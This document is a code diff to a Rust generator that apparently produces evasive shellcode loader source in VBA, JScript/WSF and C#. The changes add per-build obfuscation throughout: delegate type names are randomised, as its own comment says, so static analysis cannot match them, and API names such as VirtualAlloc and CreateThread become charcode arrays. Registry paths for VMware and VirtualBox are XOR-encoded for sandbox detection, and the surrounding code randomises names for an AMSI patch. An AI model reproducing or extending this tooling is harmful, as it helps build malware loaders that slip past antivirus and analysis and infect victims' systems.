@@ -119,6 +119,12 @@ pub struct AppDomainConfig {
 }
 
 #[derive(Debug, Clone, Serialize)]
+pub struct WsfStubConfig {
+    pub namespace: String,
+    pub type_name: String,
+}
+
+#[derive(Debug, Clone, Serialize)]
 pub struct LoaderConfig {
     pub loader_type: LoaderType,
     pub features: Vec<Feature>,
@@ -128,6 +134,8 @@ pub struct LoaderConfig {
     pub iv_hex: String,
     pub pe_config: Option<PeConfig>,
     pub appdomain_config: Option<AppDomainConfig>,
+    pub wsf_stub_config: Option<WsfStubConfig>,
+    pub dotnet_stub_hex: Option<String>,
 }
 
 #[derive(Debug, Clone, Serialize)]
@@ -235,11 +243,6 @@ fn build_context(config: &LoaderConfig) -> Context {
     // Fixed-value placeholders (NOT identifiers)
     vars.insert("clsid", rand_clsid());
     vars.insert("scriptlet_url", "http://localhost/scriptlet.sct".to_string());
-    // 16-byte dummy .NET stub (placeholder — real stub generation is out of v1 scope)
-    vars.insert(
-        "dotnet_stub_hex",
-        "4d5a90000300000004000000ffff0000".to_string(),
-    );
 
     // Patch loop idents — randomize local VBA variable names
     for k in &["var_amsi_patch", "var_amsi_xk", "var_amsi_pi",
@@ -253,6 +256,10 @@ fn build_context(config: &LoaderConfig) -> Context {
     // C# delegate variable names for NT syscall wrappers (must not be static strings)
     for k in &["fn_nt_alloc", "fn_nt_prot", "fn_nt_thread"] {
         vars.insert(k, rand_ident(10));
+    }
+    // C# delegate TYPE names — randomized so static analysis cannot match on "D_NtAVM" etc.
+    for k in &["del_nt_alloc", "del_nt_prot", "del_nt_thread"] {
+        vars.insert(k, rand_ident(8));
     }
 
     // JScript charcode arrays (comma-separated integers) for sensitive strings
@@ -269,7 +276,6 @@ fn build_context(config: &LoaderConfig) -> Context {
         ("jsc_virtual_alloc",     "VirtualAlloc"),
         ("jsc_create_thread",     "CreateThread"),
         ("jsc_sys_refl_asm",      "System.Reflection.Assembly"),
-        ("jsc_stub_loader",       "Stub.Loader"),
         ("jsc_stub_run",          "Run"),
         ("jsc_winmgmts",          "winmgmts:"),
         ("jsc_fs_obj",            "Scripting.FileSystemObject"),
@@ -296,6 +302,11 @@ fn build_context(config: &LoaderConfig) -> Context {
     for &(k, s) in jsc_pairs {
         vars.insert(k, to_charcode_jscript(s));
     }
+    // jsc_stub_loader is per-build: derived from wsf_stub_config namespace.type_name or default
+    let stub_loader_name = config.wsf_stub_config.as_ref()
+        .map(|wsc| format!("{}.{}", wsc.namespace, wsc.type_name))
+        .unwrap_or_else(|| "Stub.Loader".to_string());
+    vars.insert("jsc_stub_loader", to_charcode_jscript(&stub_loader_name));
 
     // VBA Chr() concatenation for sensitive strings
     let vba_pairs: &[(&str, &str)] = &[
@@ -396,6 +407,40 @@ fn build_context(config: &LoaderConfig) -> Context {
         ctx.insert("appdomain_net_version",   &ad.net_version);
     }
 
+    if let Some(wsc) = &config.wsf_stub_config {
+        ctx.insert("wsf_stub_namespace", &wsc.namespace);
+        ctx.insert("wsf_stub_type_name",  &wsc.type_name);
+    }
+    ctx.insert("dotnet_stub_hex",
+        config.dotnet_stub_hex.as_deref()
+              .unwrap_or("4d5a90000300000004000000ffff0000"));
+
+    // Per-build XOR encoding for VM registry key paths (VBA and WSF)
+    let vmware_reg: &[u8] = b"HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools\\InstallPath";
+    let vbox_reg:   &[u8] = b"HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\\Version";
+    let vba_vmw_xk: u8 = rng.gen();
+    let vba_vbx_xk: u8 = rng.gen();
+    let wsf_vmw_xk: u8 = rng.gen();
+    let wsf_vbx_xk: u8 = rng.gen();
+    let vba_vmware_enc: Vec<u32> = vmware_reg.iter().map(|&b| (b ^ vba_vmw_xk) as u32).collect();
+    let vba_vbox_enc:   Vec<u32> = vbox_reg.iter().map(|&b| (b ^ vba_vbx_xk) as u32).collect();
+    ctx.insert("vba_vmware_reg_enc", &vba_vmware_enc);
+    ctx.insert("vba_vmware_reg_xk",  &(vba_vmw_xk as u32));
+    ctx.insert("vba_vmware_reg_len", &((vmware_reg.len() - 1) as u32));
+    ctx.insert("vba_vbox_reg_enc",   &vba_vbox_enc);
+    ctx.insert("vba_vbox_reg_xk",    &(vba_vbx_xk as u32));
+    ctx.insert("vba_vbox_reg_len",   &((vbox_reg.len() - 1) as u32));
+    let jsc_vmware_enc: String = vmware_reg.iter()
+        .map(|&b| ((b ^ wsf_vmw_xk) as u32).to_string())
+        .collect::<Vec<_>>().join(",");
+    let jsc_vbox_enc: String = vbox_reg.iter()
+        .map(|&b| ((b ^ wsf_vbx_xk) as u32).to_string())
+        .collect::<Vec<_>>().join(",");
+    ctx.insert("jsc_vmware_reg_enc", &jsc_vmware_enc);
+    ctx.insert("jsc_vmware_reg_xk",  &(wsf_vmw_xk as u32));
+    ctx.insert("jsc_vbox_reg_enc",   &jsc_vbox_enc);
+    ctx.insert("jsc_vbox_reg_xk",    &(wsf_vbx_xk as u32));
+
     ctx
 }
 
@@ -451,6 +496,12 @@ pub fn generate_csharp_source(config: &LoaderConfig) -> Result<String, String> {
     tera.render(template_name, &ctx).map_err(|e| e.to_string())
 }
 
+pub fn generate_wsf_stub_source(config: &LoaderConfig) -> Result<String, String> {
+    let tera = build_tera()?;
+    let ctx = build_context(config);
+    tera.render("csharp/wsf_stub.cs.tera", &ctx).map_err(|e| e.to_string())
+}
+
 pub fn generate_appdomain_config(config: &AppDomainTemplateConfig) -> Result<String, String> {
     let tera = build_tera()?;
     let mut ctx = Context::new();
@@ -476,6 +527,8 @@ mod tests {
             iv_hex: "bb".repeat(16),
             pe_config: None,
             appdomain_config: None,
+            wsf_stub_config: None,
+            dotnet_stub_hex: None,
         };
         let result = generate_loader_source(&config).unwrap();
         assert!(!result.contains("let shellcode "));
@@ -508,6 +561,8 @@ mod tests {
             iv_hex: "bb".repeat(16),
             pe_config: None,
             appdomain_config: None,
+            wsf_stub_config: None,
+            dotnet_stub_hex: None,
         };
         let source = generate_loader_source(&config).unwrap();
         assert!(source.contains("DllMain"));
